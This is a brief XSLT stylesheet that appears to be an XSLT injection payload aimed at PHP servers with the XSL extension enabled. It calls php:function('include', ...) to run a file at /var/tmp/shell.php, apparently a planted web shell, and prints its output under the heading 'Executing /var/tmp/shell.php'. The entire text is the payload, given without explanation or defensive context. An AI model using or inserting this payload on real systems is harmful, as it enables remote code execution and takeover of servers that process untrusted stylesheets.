<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  <xsl:template match="*">

    <html><body>
      <h2>Executing /var/tmp/shell.php</h2>
      <pre>
        <xsl:value-of select="php:function('include', '/var/tmp/shell.php')" />
      </pre>
    </body></html>

  </xsl:template>
</xsl:stylesheet>
